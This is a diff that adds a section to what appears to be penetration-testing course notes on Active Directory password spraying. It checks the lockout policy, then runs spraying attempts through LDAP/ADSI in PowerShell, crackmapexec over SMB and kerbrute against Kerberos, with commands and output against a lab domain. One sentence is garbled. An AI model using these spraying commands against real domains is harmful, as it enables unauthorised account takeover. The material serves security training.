@@ -129,3 +129,115 @@ These certificates may be marked as having a non-exportable private key16 for se
 We can rely again on Mimikatz to accomplish this. The crypto17 module contains the capability to either patch the CryptoAPI18 function with crypto::capi19 or KeyIso20 service with crypto::cng,21 making non-exportable keys exportable.
 
 ## Performing Attacks on Active Directory Authentication
+
+### Password Attacks
+
+We should be aware of account lockouts when brute forcing.
+
+```console
+// check the account [policy
+
+PS> net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          1
+Maximum password age (days):                          42
+Minimum password length:                              7
+Length of password history maintained:                24
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+```
+
+The lockout threshold in this case is 5. Then we have to wait 30 minutes for the lockout observation window. With these settings, we could attempt 192 logins in a 24-hour period against every domain user without triggering a lockout.
+
+Let's try three other password spraying attacks that have higher chances of success.
+
+The first kind of password spraying attack uses LDAP and ADSI to perform a low and slow password attack against AD users. Previously, we performed queries against the domain controller as a logged-in user with DirectoryEntry.2 However, we can also make queries in the context of a different user by setting the DirectoryEntry instance. We used the DirectoryEntry constructor without arguments, but we can provide three arguments, including the LDAP path to the domain controller, the username, and the password.
+
+```console
+PS> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+PS> $PDC = ($domainObj.PdcRoleOwner).Name
+PS> $SearchString = "LDAP://"
+PS> $SearchString += $PDC + "/"
+PS> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+PS> $SearchString += $DistinguishedName
+PS> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+
+// if this password is correct, the object creation will be successful:
+distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC1.corp.com/DC=corp,DC=com
+
+// if the password is invalid, no object will be created and we will receive an exception
+format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
+password is incorrect.
+"
+    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
+    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
+```
+
+We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.
+
+This password spraying tactic is already implemented in the PowerShell script C:\Tools\Spray-Passwords.ps1 on this client. The -Pass option allows us to set a single password to test, or we can submit a wordlist file using -File. We can also test admin accounts by adding the -Admin flag.
+
+```console
+PS> cd C:\Tools
+
+PS> powershell -ep bypass
+
+PS> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+WARNING: also targeting admin accounts.
+Performing brute force - press [q] to stop the process and print results...
+Guessed password for user: 'pete' = 'Nexus123!'
+Guessed password for user: 'jen' = 'Nexus123!'
+Users guessed are:
+ 'pete' with password: 'Nexus123!'
+ 'jen' with password: 'Nexus123!'
+```
+
+The second kind of password spraying attack against AD users leverages SMB. comes with some drawbacks. This attack comes with drawbacks though, as for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy and slow.
+
+We can use crackmapexec on Kali to do this.
+
+```console
+kali$ cat users.txt
+dave
+jen
+pete
+
+kali$ crackmapexec smb 192.168.249.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+SMB         192.168.249.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
+SMB         192.168.249.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
+SMB         192.168.249.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
+```
+
+Note: crackmapexec doesn't examine the password policy of the domain before starting the password spraying. Be cautious about locking out user accounts with this method.
+
+It does tell us who has admin privs on the target system, though, which we see when it appends (Pwn3d!) to the output.
+
+```console
+kali$ crackmapexec smb 192.168.249.75 -u dave -p 'Flowers1' -d corp.com
+SMB         192.168.249.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
+```
+
+Lastly, let's try password spraying by obtaining a TGT. Using kinit5 on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. We could use Bash scripting or a programming language of our choice to automate this method. Fortunately, we can also use the tool kerbrute, which can be used on Windows and Linux.
+
+```console
+PS> type .\usernames.txt
+pete
+dave
+jen
+
+PS> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+2024/04/16 12:44:19 >  Using KDC(s):
+2024/04/16 12:44:19 >   dc1.corp.com:88
+2024/04/16 12:44:19 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
+2024/04/16 12:44:19 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
+2024/04/16 12:44:19 >  Done! Tested 3 logins (2 successes) in 0.104 seconds
+```
+
+Note: If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
+
+### AS-REP Roasting
+
